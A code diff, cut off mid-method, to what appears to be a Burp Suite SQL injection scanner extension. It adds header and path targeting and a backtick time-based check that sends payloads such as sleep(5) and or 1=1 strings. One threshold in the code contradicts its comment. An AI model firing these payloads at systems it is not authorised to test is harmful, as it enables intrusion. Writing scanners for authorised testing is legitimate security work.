@@ -7,14 +7,16 @@ import java.awt.Font;
 import java.awt.GridLayout;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
-import java.io.FileReader;
-import java.io.FileWriter;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.lang.reflect.Method;
 import java.net.URI;
+import java.net.URISyntaxException;
 import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.security.MessageDigest;
 import java.util.ArrayList;
 import java.util.Collections;
@@ -52,6 +54,7 @@ import burp.api.montoya.http.handler.HttpRequestToBeSent;
 import burp.api.montoya.http.handler.HttpResponseReceived;
 import burp.api.montoya.http.handler.RequestToBeSentAction;
 import burp.api.montoya.http.handler.ResponseReceivedAction;
+import burp.api.montoya.http.message.HttpHeader;
 import burp.api.montoya.http.message.HttpRequestResponse;
 import burp.api.montoya.http.message.params.HttpParameter;
 import burp.api.montoya.http.message.params.HttpParameterType;
@@ -92,7 +95,8 @@ public class BurpExtender implements BurpExtension {
     private int    diyPayload1    = 1;
     private int    diyPayload2    = 0;
     private Table  logTable;
-    private int    isCookie       = -1;
+    private int    isHeader       = -1;
+    private int    isPath         = 2;
     private String whiteUrl       = "*";
     private int    whiteSwitchs   = 0;
     private volatile int requestIntervalMs = 100;
@@ -100,6 +104,19 @@ public class BurpExtender implements BurpExtension {
     private final Object sendLock = new Object();
     private static final int MAX_REQUESTS_PER_PARAM = 18;
     private static final long SINGLE_REQUEST_SLOW_MS = 4000;
+    private static final Set<String> HEADER_BLACKLIST = Set.of(
+            "connection",
+            "accept",
+            "accept-language",
+            "host",
+            "content-length",
+            "transfer-encoding"
+    );
+    private volatile Set<String> customHeaderBlacklist = new HashSet<>(Set.of(
+            "connection",
+            "accept",
+            "accept-language"
+    ));
     private final AtomicInteger detailRefreshPending = new AtomicInteger(0);
 
     // ── 自定义报错信息 ────────────────────────────────────────
@@ -139,6 +156,8 @@ public class BurpExtender implements BurpExtension {
                     "SQLite error\n" +
                     "Sybase message\n" +
                     "SybSQLException";
+    private static final String DIY_PAYLOAD_FILE = "xia_SQL_diy_payload.ini";
+    private static final String DEFAULT_DIY_PAYLOAD = "%df' and sleep(3)%23\n'and '1'='1";
 
     private String diyErrorText = DEFAULT_ERROR_PATTERNS;
     private volatile List<Pattern> compiledErrorPatterns = Collections.emptyList();
@@ -287,7 +306,7 @@ public class BurpExtender implements BurpExtension {
 
         // ── 右侧控制面板 ────────────────────────────────────
         JSplitPane rightPanel = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
-        JPanel ctrlPanel = new JPanel(new GridLayout(16, 1));
+        JPanel ctrlPanel = new JPanel(new GridLayout(20, 1));
         ctrlPanel.add(new JLabel("插件名：瞎注 author：子夜"));
         ctrlPanel.add(new JLabel("blog:sunwu.world"));
         ctrlPanel.add(new JLabel("版本：xia SQL V3.3二开版本"));
@@ -296,17 +315,24 @@ public class BurpExtender implements BurpExtension {
         JCheckBox chkbox1 = new JCheckBox("启动插件", true);
         JCheckBox chkbox2 = new JCheckBox("监控Repeater");
         JCheckBox chkbox3 = new JCheckBox("监控Proxy");
-        JCheckBox chkbox8 = new JCheckBox("测试Cookie");
+        JCheckBox chkbox4 = new JCheckBox("测试Path", true);
+        JCheckBox chkbox8 = new JCheckBox("测试Header");
         JTextField textField = new JTextField("*");
-        JTextField intervalField = new JTextField("发包间隔毫秒(默认0)");
+        JTextField intervalField = new JTextField("100");
+        JTextField headerBlacklistField = new JTextField("Connection,Accept,Accept-Language");
         JButton btn1 = new JButton("清空列表");
         JButton btn3 = new JButton("启动白名单");
         JButton btnInterval = new JButton("设置发包间隔");
+        JButton btnHeaderBlacklist = new JButton("设置Header黑名单");
 
         ctrlPanel.add(chkbox1);
         ctrlPanel.add(chkbox2);
         ctrlPanel.add(chkbox3);
+        ctrlPanel.add(chkbox4);
         ctrlPanel.add(chkbox8);
+        ctrlPanel.add(new JLabel("Header黑名单(逗号分隔)"));
+        ctrlPanel.add(headerBlacklistField);
+        ctrlPanel.add(btnHeaderBlacklist);
         ctrlPanel.add(new JLabel("全局发包间隔(毫秒)"));
         ctrlPanel.add(intervalField);
         ctrlPanel.add(btnInterval);
@@ -331,13 +357,8 @@ public class BurpExtender implements BurpExtension {
         yx1Top.add(chkbox7);
         yx1Top.add(btn2);
 
-        JTextArea jta = new JTextArea("%df' and sleep(3)%23\n'and '1'='1", 18, 16);
-        try (BufferedReader in = new BufferedReader(new FileReader("xia_SQL_diy_payload.ini"))) {
-            StringBuilder sb = new StringBuilder();
-            String line;
-            while ((line = in.readLine()) != null) sb.append(line).append("\n");
-            jta.setText(sb.toString());
-        } catch (IOException ignored) {}
+        JTextArea jta = new JTextArea(DEFAULT_DIY_PAYLOAD, 18, 16);
+        jta.setText(loadDiyPayloadText());
         jta.setForeground(Color.BLACK);
         jta.setFont(new Font("楷体", Font.BOLD, 16));
         jta.setBackground(Color.LIGHT_GRAY);
@@ -398,6 +419,10 @@ public class BurpExtender implements BurpExtension {
             clicksProxy = chkbox3.isSelected() ? 1 : 0;
             stdout.println((chkbox3.isSelected() ? "启动" : "关闭") + " 监控Proxy");
         });
+        chkbox4.addItemListener(e -> {
+            isPath = chkbox4.isSelected() ? 2 : -1;
+            stdout.println((chkbox4.isSelected() ? "启动" : "关闭") + " 测试Path");
+        });
         chkbox5.addItemListener(e -> {
             if (chkbox5.isSelected()) {
                 jta.setEditable(true);
@@ -428,8 +453,8 @@ public class BurpExtender implements BurpExtension {
             stdout.println((chkbox7.isSelected() ? "启动" : "关闭") + " 自定义payload参数值置空");
         });
         chkbox8.addItemListener(e -> {
-            isCookie = chkbox8.isSelected() ? 2 : -1;
-            stdout.println((chkbox8.isSelected() ? "启动" : "关闭") + " 测试Cookie");
+            isHeader = chkbox8.isSelected() ? 2 : -1;
+            stdout.println((chkbox8.isSelected() ? "启动" : "关闭") + " 测试Header");
         });
         chkboxDiyError.addItemListener(e -> {
             if (chkboxDiyError.isSelected()) {
@@ -454,10 +479,11 @@ public class BurpExtender implements BurpExtension {
         });
         btn2.addActionListener(e -> {
             jTextAreaData1 = (diyPayload1 == 1) ? jta.getText().replace(" ", "%20") : jta.getText();
-            try (BufferedWriter out = new BufferedWriter(new FileWriter("xia_SQL_diy_payload.ini"))) {
-                out.write(jTextAreaData1);
-            } catch (IOException ignored) {}
-            stdout.println("payload 已加载");
+            if (saveDiyPayloadText(jTextAreaData1)) {
+                stdout.println("payload 已加载");
+            } else {
+                stdout.println("payload 保存失败，请检查文件权限");
+            }
         });
         textField.setEditable(true);
         textField.setForeground(Color.BLACK);
@@ -494,6 +520,12 @@ public class BurpExtender implements BurpExtension {
             requestIntervalMs = value;
             stdout.println("发包间隔已设置为 " + requestIntervalMs + " ms");
         });
+        btnHeaderBlacklist.addActionListener(e -> {
+            String text = headerBlacklistField.getText() == null ? "" : headerBlacklistField.getText().trim();
+            Set<String> parsed = parseHeaderBlacklist(text);
+            customHeaderBlacklist = parsed;
+            stdout.println("Header黑名单已设置为: " + String.join(",", parsed));
+        });
         logBtn.addActionListener(e -> logTextArea.setText(""));
 
         api.userInterface().registerSuiteTab("xia SQL", splitPane);
@@ -511,7 +543,7 @@ public class BurpExtender implements BurpExtension {
         String scanId = "RID-" + System.nanoTime();
         String requestHost = extractHost(req.url().toString());
 
-        List<ParsedHttpParameter> paraLists = req.parameters();
+        List<ScanTarget> targets = buildScanTargets(req);
         String requestBase = req.url().toString().split("\\?")[0];
 
         // 白名单过滤
@@ -533,13 +565,11 @@ public class BurpExtender implements BurpExtension {
         }
 
         // 构建 MD5 去重 key
-        for (ParsedHttpParameter para : paraLists) {
-            HttpParameterType type = para.type();
-            if (type == HttpParameterType.URL || type == HttpParameterType.BODY ||
-                    type == HttpParameterType.JSON ||
-                    (isCookie == 2 && type == HttpParameterType.COOKIE)) {
+        for (ScanTarget target : targets) {
+            if (target.isHeaderTarget || target.isPathTarget || target.paramType == HttpParameterType.URL || target.paramType == HttpParameterType.BODY ||
+                    target.paramType == HttpParameterType.JSON) {
                 isAdd = 1;
-                requestBase += "+" + para.name();
+                requestBase += "+" + target.name;
             }
         }
         requestBase += "+" + req.method();
@@ -579,15 +609,13 @@ public class BurpExtender implements BurpExtension {
         int baseRespLen = resp.body().length();
         boolean anyVulnFound = false;
 
-        for (ParsedHttpParameter para : req.parameters()) {
-            HttpParameterType type = para.type();
-            boolean valid = (type == HttpParameterType.URL || type == HttpParameterType.BODY ||
-                    type == HttpParameterType.JSON ||
-                    (isCookie == 2 && type == HttpParameterType.COOKIE));
+        for (ScanTarget target : targets) {
+            boolean valid = target.isHeaderTarget || target.isPathTarget || target.paramType == HttpParameterType.URL ||
+                    target.paramType == HttpParameterType.BODY || target.paramType == HttpParameterType.JSON;
             if (!valid) continue;
 
-            String key   = para.name();
-            String value = para.value();
+            String key   = target.name;
+            String value = target.value;
             appendLog(scanId + " 测试参数：url=" + req.url() + " param=" + key + " value=" + value);
             int sentRequests = 0;
             boolean slowDetected = false;
@@ -599,6 +627,7 @@ public class BurpExtender implements BurpExtension {
             List<LogEntry> expEntries = new ArrayList<>();
             List<LogEntry> divEntries = new ArrayList<>();
             List<LogEntry> sleepEntries = new ArrayList<>();
+            List<LogEntry> backtickEntries = new ArrayList<>();
             List<LogEntry> diyEntries = new ArrayList<>();
             List<LogEntry> fuzzyEntries = new ArrayList<>();
 
@@ -623,7 +652,7 @@ public class BurpExtender implements BurpExtension {
                     appendLog(scanId + " 参数=" + key + " 达到最大测试请求数，停止后续payload");
                     break;
                 }
-                HttpRequest qReq = buildMutatedRequest(req, para, value + quotePayloads[qi]);
+                HttpRequest qReq = buildMutatedRequest(req, target, value + quotePayloads[qi]);
                 long t1 = System.currentTimeMillis();
                 HttpRequestResponse qResult = sendRequestWithInterval(qReq);
                 long cost = System.currentTimeMillis() - t1;
@@ -655,7 +684,7 @@ public class BurpExtender implements BurpExtension {
 
             boolean cond1 = Math.abs(len2 - len4) <= 5; // 偶数引号长度相近
             boolean cond2 = Math.abs(len1 - len3) <= 5; // 奇数引号长度相近
-            boolean cond3 = Math.abs(len1 - len2) > 5;  // 奇偶引号长度差异明显
+            boolean cond3 = Math.abs(len1 - len2) >= 4;  // 奇偶引号长度差异明显
 
             boolean quoteVuln = cond1 && cond2 && cond3;
 
@@ -666,7 +695,7 @@ public class BurpExtender implements BurpExtension {
 
                 if (sentRequests < MAX_REQUESTS_PER_PARAM) {
                     String firstPayloadValue = value + "-0-0-0";
-                    HttpRequest firstReq = buildMutatedRequest(req, para, firstPayloadValue);
+                    HttpRequest firstReq = buildMutatedRequest(req, target, firstPayloadValue);
 
                     long t1 = System.currentTimeMillis();
                     HttpRequestResponse firstResult = sendRequestWithInterval(firstReq);
@@ -695,7 +724,7 @@ public class BurpExtender implements BurpExtension {
 
                     if (firstOk && simBaseFirst > 0.90 && sentRequests < MAX_REQUESTS_PER_PARAM) {
                         String secondPayloadValue = value + "-abc";
-                        HttpRequest secondReq = buildMutatedRequest(req, para, secondPayloadValue);
+                        HttpRequest secondReq = buildMutatedRequest(req, target, secondPayloadValue);
 
                         long t2 = System.currentTimeMillis();
                         HttpRequestResponse secondResult = sendRequestWithInterval(secondReq);
@@ -735,7 +764,7 @@ public class BurpExtender implements BurpExtension {
 
                 if (sentRequests < MAX_REQUESTS_PER_PARAM) {
                     String poc1Value = value + ",0";
-                    HttpRequest poc1Req = buildMutatedRequest(req, para, poc1Value);
+                    HttpRequest poc1Req = buildMutatedRequest(req, target, poc1Value);
                     long t1 = System.currentTimeMillis();
                     HttpRequestResponse poc1Result = sendRequestWithInterval(poc1Req);
                     long cost1 = System.currentTimeMillis() - t1;
@@ -761,7 +790,7 @@ public class BurpExtender implements BurpExtension {
 
                     if (poc1Ok && simBasePoc1 < 0.90 && sentRequests < MAX_REQUESTS_PER_PARAM) {
                         String poc2Value = value + ",XXXXXX";
-                        HttpRequest poc2Req = buildMutatedRequest(req, para, poc2Value);
+                        HttpRequest poc2Req = buildMutatedRequest(req, target, poc2Value);
                         long t2 = System.currentTimeMillis();
                         HttpRequestResponse poc2Result = sendRequestWithInterval(poc2Req);
                         long cost2 = System.currentTimeMillis() - t2;
@@ -794,7 +823,7 @@ public class BurpExtender implements BurpExtension {
 
                                 if (sentRequests < MAX_REQUESTS_PER_PARAM) {
                                     String poc3Value = value + ",1";
-                                    HttpRequest poc3Req = buildMutatedRequest(req, para, poc3Value);
+                                    HttpRequest poc3Req = buildMutatedRequest(req, target, poc3Value);
                                     long t3 = System.currentTimeMillis();
                                     HttpRequestResponse poc3Result = sendRequestWithInterval(poc3Req);
                                     long cost3 = System.currentTimeMillis() - t3;
@@ -827,7 +856,7 @@ public class BurpExtender implements BurpExtension {
 
                                 if (!poc3OrPoc4Hit && sentRequests < MAX_REQUESTS_PER_PARAM) {
                                     String poc4Value = value + ",2";
-                                    HttpRequest poc4Req = buildMutatedRequest(req, para, poc4Value);
+                                    HttpRequest poc4Req = buildMutatedRequest(req, target, poc4Value);
                                     long t4 = System.currentTimeMillis();
                                     HttpRequestResponse poc4Result = sendRequestWithInterval(poc4Req);
                                     long cost4 = System.currentTimeMillis() - t4;
@@ -868,7 +897,94 @@ public class BurpExtender implements BurpExtension {
             boolean expVuln = false;
             boolean divVuln = false;
             boolean sleepVuln = false;
+            boolean backtickVuln = false;
             boolean fuzzyVuln = false;
+
+            // 反引号注入检测：
+            // poc1: value`                    -> 与原始响应体长度差 > 10
+            // poc2: value`and+sleep(2)--+     -> 与原始响应时间差 >= 2s
+            // poc3: value`and+sleep(5)--+     -> 与原始响应时间差 < 4s (命中)
+            {
+                int baseLen = baseRespLen;
+                long baseCostMs = (quickBaselineCost == Long.MAX_VALUE) ? 0 : quickBaselineCost;
+
+                if (sentRequests < MAX_REQUESTS_PER_PARAM) {
+                    String poc1Value = value + "`";
+                    HttpRequest poc1Req = buildMutatedRequest(req, target, poc1Value);
+                    long t1 = System.currentTimeMillis();
+                    HttpRequestResponse poc1Result = sendRequestWithInterval(poc1Req);
+                    long cost1 = System.currentTimeMillis() - t1;
+                    sentRequests++;
+                    if (cost1 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                    HttpResponse poc1Resp = poc1Result.response();
+                    boolean poc1Ok = (poc1Resp != null && poc1Resp.statusCode() >= 200 && poc1Resp.statusCode() < 300);
+                    if (poc1Ok && cost1 < quickBaselineCost) quickBaselineCost = cost1;
+
+                    int code1 = poc1Ok ? poc1Resp.statusCode() : 0;
+                    HttpRequestResponse poc1Display = buildDisplayMessage(poc1Req, poc1Result);
+                    LogEntry poc1Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc1Display,
+                            poc1Req.url().toString(),
+                            key, poc1Value, "", requestMd5, (int) cost1, "end", code1, false));
+                    paramEntries.add(poc1Entry);
+                    backtickEntries.add(poc1Entry);
+
+                    int poc1Len = poc1Ok ? poc1Resp.body().length() : 0;
+                    int lenDiff = Math.abs(poc1Len - baseLen);
+                    boolean poc1Hit = poc1Ok && lenDiff > 10;
+                    appendLog(String.format("  反引号测试 [%s] poc1=value` len(base=%d, poc1=%d, diff=%d) result=%s",
+                            key, baseLen, poc1Len, lenDiff, poc1Hit));
+
+                    if (poc1Hit && sentRequests < MAX_REQUESTS_PER_PARAM) {
+                        String poc2Value = value + "`and+sleep(2)--+";
+                        HttpRequest poc2Req = buildMutatedRequest(req, target, poc2Value);
+                        long t2 = System.currentTimeMillis();
+                        HttpRequestResponse poc2Result = sendRequestWithInterval(poc2Req);
+                        long cost2 = System.currentTimeMillis() - t2;
+                        sentRequests++;
+                        if (cost2 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                        HttpResponse poc2Resp = poc2Result.response();
+                        boolean poc2Ok = (poc2Resp != null && poc2Resp.statusCode() >= 200 && poc2Resp.statusCode() < 300);
+
+                        int code2 = poc2Ok ? poc2Resp.statusCode() : 0;
+                        HttpRequestResponse poc2Display = buildDisplayMessage(poc2Req, poc2Result);
+                        LogEntry poc2Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc2Display,
+                                poc2Req.url().toString(),
+                                key, poc2Value, "", requestMd5, (int) cost2, "end", code2, false));
+                        paramEntries.add(poc2Entry);
+                        backtickEntries.add(poc2Entry);
+
+                        long diff2 = cost2 - baseCostMs;
+                        boolean poc2Hit = poc2Ok && diff2 >= 2000;
+                        appendLog(String.format("  反引号测试 [%s] poc2=value`and+sleep(2)--+ cost(base=%dms, poc2=%dms, diff=%dms) result=%s",
+                                key, baseCostMs, cost2, diff2, poc2Hit));
+
+                        if (poc2Hit && sentRequests < MAX_REQUESTS_PER_PARAM) {
+                            String poc3Value = value + "`and+sleep(5)--+";
+                            HttpRequest poc3Req = buildMutatedRequest(req, target, poc3Value);
+                            long t3 = System.currentTimeMillis();
+                            HttpRequestResponse poc3Result = sendRequestWithInterval(poc3Req);
+                            long cost3 = System.currentTimeMillis() - t3;
+                            sentRequests++;
+                            if (cost3 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                            HttpResponse poc3Resp = poc3Result.response();
+                            boolean poc3Ok = (poc3Resp != null && poc3Resp.statusCode() >= 200 && poc3Resp.statusCode() < 300);
+
+                            int code3 = poc3Ok ? poc3Resp.statusCode() : 0;
+                            HttpRequestResponse poc3Display = buildDisplayMessage(poc3Req, poc3Result);
+                            LogEntry poc3Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc3Display,
+                                    poc3Req.url().toString(),
+                                    key, poc3Value, "", requestMd5, (int) cost3, "end", code3, false));
+                            paramEntries.add(poc3Entry);
+                            backtickEntries.add(poc3Entry);
+
+                            long diff3 = cost3 - baseCostMs;
+                            backtickVuln = poc3Ok && diff3 < 6000;
+                            appendLog(String.format("  反引号测试 [%s] poc3=value`and+sleep(5)--+ cost(base=%dms, poc3=%dms, diff=%dms) result=%s",
+                                    key, baseCostMs, cost3, diff3, backtickVuln));
+                        }
+                    }
+                }
+            }
 
             // 模糊查询注入检测：
             // poc1: value'                  -> 与原始响应长度差异 > 10
@@ -880,7 +996,7 @@ public class BurpExtender implements BurpExtension {
 
                 if (sentRequests < MAX_REQUESTS_PER_PARAM) {
                     String poc1Value = value + "'";
-                    HttpRequest poc1Req = buildMutatedRequest(req, para, poc1Value);
+                    HttpRequest poc1Req = buildMutatedRequest(req, target, poc1Value);
                     long t1 = System.currentTimeMillis();
                     HttpRequestResponse poc1Result = sendRequestWithInterval(poc1Req);
                     long cost1 = System.currentTimeMillis() - t1;
@@ -906,7 +1022,7 @@ public class BurpExtender implements BurpExtension {
 
                     if (poc1Hit && sentRequests < MAX_REQUESTS_PER_PARAM) {
                         String poc2Value = value + "'+or+1=1--+";
-                        HttpRequest poc2Req = buildMutatedRequest(req, para, poc2Value);
+                        HttpRequest poc2Req = buildMutatedRequest(req, target, poc2Value);
                         long t2 = System.currentTimeMillis();
                         HttpRequestResponse poc2Result = sendRequestWithInterval(poc2Req);
                         long cost2 = System.currentTimeMillis() - t2;
@@ -926,7 +1042,7 @@ public class BurpExtender implements BurpExtension {
 
                         if (sentRequests < MAX_REQUESTS_PER_PARAM) {
                             String poc3Value = value + "'+or+1=2--+";
-                            HttpRequest poc3Req = buildMutatedRequest(req, para, poc3Value);
+                            HttpRequest poc3Req = buildMutatedRequest(req, target, poc3Value);
                             long t3 = System.currentTimeMillis();
                             HttpRequestResponse poc3Result = sendRequestWithInterval(poc3Req);
                             long cost3 = System.currentTimeMillis() - t3;
@@ -980,7 +1096,7 @@ public class BurpExtender implements BurpExtension {
             }
 
             // 分级检测：快速规则命中后，跳过重型规则(exp/div/sleep)
-            boolean fastRuleHit = quoteVuln || numVuln || commaVuln || fuzzyVuln || errorVuln;
+            boolean fastRuleHit = quoteVuln || numVuln || commaVuln || fuzzyVuln || backtickVuln || errorVuln;
             if (!fastRuleHit && !slowDetected && sentRequests < MAX_REQUESTS_PER_PARAM) {
                 // Oracle exp 检测：'||exp(200)||' / '||exp(11111)||'
                 String[] expPayloads = {"'||exp(200)||'", "'||exp(11111)||'"};
@@ -991,7 +1107,7 @@ public class BurpExtender implements BurpExtension {
                         break;
                     }
                     String payloadValue = value + expPayloads[ei];
-                    HttpRequest expReq = buildMutatedRequest(req, para, payloadValue);
+                    HttpRequest expReq = buildMutatedRequest(req, target, payloadValue);
                     long t1 = System.currentTimeMillis();
                     HttpRequestResponse expResult = sendRequestWithInterval(expReq);
                     long cost = System.currentTimeMillis() - t1;
@@ -1024,7 +1140,7 @@ public class BurpExtender implements BurpExtension {
                         break;
                     }
                     String payloadValue = value + divPayloads[di];
-                    HttpRequest divReq = buildMutatedRequest(req, para, payloadValue);
+                    HttpRequest divReq = buildMutatedRequest(req, target, payloadValue);
                     long t1 = System.currentTimeMillis();
                     HttpRequestResponse divResult = sendRequestWithInterval(divReq);
                     long cost = System.currentTimeMillis() - t1;
@@ -1052,7 +1168,7 @@ public class BurpExtender implements BurpExtension {
                 if (sentRequests < MAX_REQUESTS_PER_PARAM) {
                     String sleepPayload = ") and sleep(5) and (1=1";
                     String payloadValue = value + sleepPayload;
-                    HttpRequest sleepReq = buildMutatedRequest(req, para, payloadValue);
+                    HttpRequest sleepReq = buildMutatedRequest(req, target, payloadValue);
                     long t1 = System.currentTimeMillis();
                     HttpRequestResponse sleepResult = sendRequestWithInterval(sleepReq);
                     long cost = System.currentTimeMillis() - t1;
@@ -1094,7 +1210,7 @@ public class BurpExtender implements BurpExtension {
                     String useValue = (diyPayload2 == 1) ? "" : value;
                     HttpRequest diyReq;
                     long t1 = System.currentTimeMillis();
-                    diyReq = buildMutatedRequest(req, para, useValue + payload);
+                    diyReq = buildMutatedRequest(req, target, useValue + payload);
                     HttpRequestResponse diyResult = sendRequestWithInterval(diyReq);
                     long cost = System.currentTimeMillis() - t1;
                     sentRequests++;
@@ -1137,7 +1253,7 @@ public class BurpExtender implements BurpExtension {
             }
 
             // ── 汇总当前参数结论 ────────────────────────────
-            boolean paramVuln = quoteVuln || numVuln || commaVuln || fuzzyVuln || expVuln || divVuln || sleepVuln || errorVuln || diyVuln;
+            boolean paramVuln = quoteVuln || numVuln || commaVuln || fuzzyVuln || backtickVuln || expVuln || divVuln || sleepVuln || errorVuln || diyVuln;
             List<String> triggeredSigns = new ArrayList<>();
             if (quoteVuln) {
                 triggeredSigns.add("✔ 单引号拼接注入");
@@ -1155,6 +1271,10 @@ public class BurpExtender implements BurpExtension {
             if (fuzzyVuln) {
                 triggeredSigns.add("✔ 模糊查询注入");
                 appendLog("【模糊查询注入】参数:" + key + " 触发 value' -> or 1=1 -> or 1=2 规则");
+            }
+            if (backtickVuln) {
+                triggeredSigns.add("✔ 反引号注入");
+                appendLog("【反引号注入】参数:" + key + " 触发 value` -> sleep(2) -> sleep(5) 时间规则");
             }
             if (expVuln) {
                 triggeredSigns.add("✔ 表达式注入(exp)");
@@ -1184,6 +1304,7 @@ public class BurpExtender implements BurpExtension {
                 if (numVuln) markEntries(numEntries, "✔ 数字型注入");
                 if (commaVuln) markEntries(commaEntries, "✔ order注入");
                 if (fuzzyVuln) markEntries(fuzzyEntries, "✔ 模糊查询注入");
+                if (backtickVuln) markEntries(backtickEntries, "✔ 反引号注入");
                 if (expVuln) markEntries(expEntries, "✔ 表达式注入(exp)");
                 if (divVuln) markEntries(divEntries, "✔ 表达式注入(除零)");
                 if (sleepVuln) markEntries(sleepEntries, "✔ 延时注入(sleep)");
@@ -1419,8 +1540,15 @@ public class BurpExtender implements BurpExtension {
         }
     }
 
-    private HttpRequest buildMutatedRequest(HttpRequest req, ParsedHttpParameter target, String newValue) {
-        HttpParameterType type = target.type();
+    private HttpRequest buildMutatedRequest(HttpRequest req, ScanTarget target, String newValue) {
+        if (target.isHeaderTarget) {
+            return updateHeaderValue(req, target.name, newValue);
+        }
+        if (target.isPathTarget) {
+            return updatePathValue(req, target.pathIndex, newValue);
+        }
+
+        HttpParameterType type = target.paramType;
         boolean jsonLike = (type == HttpParameterType.JSON || isJsonBody(req));
         boolean xmlLike = isXmlBody(req);
 
@@ -1432,17 +1560,246 @@ public class BurpExtender implements BurpExtension {
         }
 
         if (jsonLike) {
-            HttpRequest jsonReq = buildJsonRequest(req, target.name(), newValue);
+            HttpRequest jsonReq = buildJsonRequest(req, target.name, newValue);
             if (jsonReq != req) return normalizeBodyFraming(jsonReq);
             return req;
         }
         if (xmlLike) {
-            HttpRequest xmlReq = buildXmlRequest(req, target.name(), newValue);
+            HttpRequest xmlReq = buildXmlRequest(req, target.name, newValue);
             if (xmlReq != req) return normalizeBodyFraming(xmlReq);
             return req;
         }
 
-        return req.withUpdatedParameters(HttpParameter.parameter(target.name(), newValue, type));
+        return req.withUpdatedParameters(HttpParameter.parameter(target.name, newValue, type));
+    }
+
+    private HttpRequest updateHeaderValue(HttpRequest req, String headerName, String newValue) {
+        HttpRequest updated = tryInvokeRequestMethod(req, "withUpdatedHeader", headerName, newValue);
+        if (updated != req) return updated;
+        return tryInvokeRequestMethod(req, "withAddedHeader", headerName, newValue);
+    }
+
+    private HttpRequest updatePathValue(HttpRequest req, int pathIndex, String newValue) {
+        try {
+            URI uri = URI.create(req.url().toString());
+            String rawPath = uri.getRawPath();
+            if (rawPath == null || rawPath.isEmpty()) return req;
+
+            String[] parts = rawPath.split("/", -1);
+            int current = -1;
+            for (int i = 0; i < parts.length; i++) {
+                if (parts[i] == null || parts[i].isEmpty()) continue;
+                current++;
+                if (current == pathIndex) {
+                    parts[i] = newValue;
+                    break;
+                }
+            }
+
+            StringBuilder pathBuilder = new StringBuilder();
+            for (int i = 0; i < parts.length; i++) {
+                if (i > 0) pathBuilder.append('/');
+                pathBuilder.append(parts[i]);
+            }
+
+            StringBuilder newUrl = new StringBuilder();
+            newUrl.append(uri.getScheme()).append("://").append(uri.getRawAuthority());
+            newUrl.append(pathBuilder);
+            if (uri.getRawQuery() != null && !uri.getRawQuery().isEmpty()) {
+                newUrl.append('?').append(uri.getRawQuery());
+            }
+            if (uri.getRawFragment() != null && !uri.getRawFragment().isEmpty()) {
+                newUrl.append('#').append(uri.getRawFragment());
+            }
+
+            HttpRequest updated = applyRequestUrl(req, newUrl.toString());
+            if (updated == req) {
+                appendLog("Path改写失败，跳过该payload: " + newUrl);
+                return req;
+            }
+            return updated;
+        } catch (Exception ignored) {
+            return req;
+        }
+    }
+
+    private HttpRequest applyRequestUrl(HttpRequest req, String newUrl) {
+        HttpRequest updated = tryInvokeRequestMethod(req, "withUrl", newUrl);
+        if (isUrlChanged(req, updated)) return updated;
+
+        updated = tryInvokeRequestMethod(req, "withUpdatedUrl", newUrl);
+        if (isUrlChanged(req, updated)) return updated;
+
+        updated = tryInvokeRequestMethod(req, "withPath", extractRawPath(newUrl));
+        if (isUrlChanged(req, updated)) return updated;
+
+        updated = tryInvokeRequestMethod(req, "withUpdatedPath", extractRawPath(newUrl));
+        if (isUrlChanged(req, updated)) return updated;
+
+        try {
+            URI targetUri = new URI(newUrl);
+            updated = tryInvokeRequestMethod(req, "withUrl", targetUri);
+            if (isUrlChanged(req, updated)) return updated;
+
+            updated = tryInvokeRequestMethod(req, "withUpdatedUrl", targetUri);
+            if (isUrlChanged(req, updated)) return updated;
+        } catch (URISyntaxException ignored) {}
+
+        return req;
+    }
+
+    private boolean isUrlChanged(HttpRequest original, HttpRequest candidate) {
+        if (candidate == null || candidate == original) return false;
+        try {
+            String o = original.url().toString();
+            String c = candidate.url().toString();
+            return !o.equals(c);
+        } catch (Exception ignored) {
+            return false;
+        }
+    }
+
+    private String extractRawPath(String url) {
+        try {
+            URI uri = URI.create(url);
+            return uri.getRawPath();
+        } catch (Exception ignored) {
+            return "/";
+        }
+    }
+
+    private List<ScanTarget> buildScanTargets(HttpRequest req) {
+        List<ScanTarget> targets = new ArrayList<>();
+        for (ParsedHttpParameter para : req.parameters()) {
+            HttpParameterType type = para.type();
+            if (type == HttpParameterType.URL || type == HttpParameterType.BODY || type == HttpParameterType.JSON) {
+                targets.add(ScanTarget.parameterTarget(para));
+            }
+        }
+
+        if (isHeader == 2) {
+            for (HttpHeader header : req.headers()) {
+                String name = header.name();
+                String value = header.value();
+                if (isInjectableHeader(name, value)) {
+                    targets.add(ScanTarget.headerTarget(name, value));
+                }
+            }
+        }
+
+        if (isPath == 2) {
+            targets.addAll(buildPathTargets(req));
+        }
+
+        return targets;
+    }
+
+    private List<ScanTarget> buildPathTargets(HttpRequest req) {
+        List<ScanTarget> targets = new ArrayList<>();
+        try {
+            URI uri = URI.create(req.url().toString());
+            String rawPath = uri.getRawPath();
+            if (rawPath == null || rawPath.isEmpty()) return targets;
+
+            String[] parts = rawPath.split("/", -1);
+            int pathIndex = 0;
+            for (String part : parts) {
+                if (part == null || part.isEmpty()) continue;
+                String trimmed = part.trim();
+                if (trimmed.isEmpty()) continue;
+                if (trimmed.contains(".")) {
+                    pathIndex++;
+                    continue;
+                }
+                targets.add(ScanTarget.pathTarget("path[" + pathIndex + "]", trimmed, pathIndex));
+                pathIndex++;
+            }
+        } catch (Exception ignored) {}
+        return targets;
+    }
+
+    private boolean isInjectableHeader(String name, String value) {
+        if (name == null || value == null) return false;
+        String n = name.trim().toLowerCase();
+        if (n.isEmpty()) return false;
+        if (HEADER_BLACKLIST.contains(n) || customHeaderBlacklist.contains(n)) {
+            return false;
+        }
+        return !value.trim().isEmpty();
+    }
+
+    private Set<String> parseHeaderBlacklist(String text) {
+        Set<String> set = new HashSet<>();
+        if (text == null || text.trim().isEmpty()) return set;
+        for (String item : text.split(",")) {
+            String v = item == null ? "" : item.trim().toLowerCase();
+            if (!v.isEmpty()) set.add(v);
+        }
+        return set;
+    }
+
+    private String loadDiyPayloadText() {
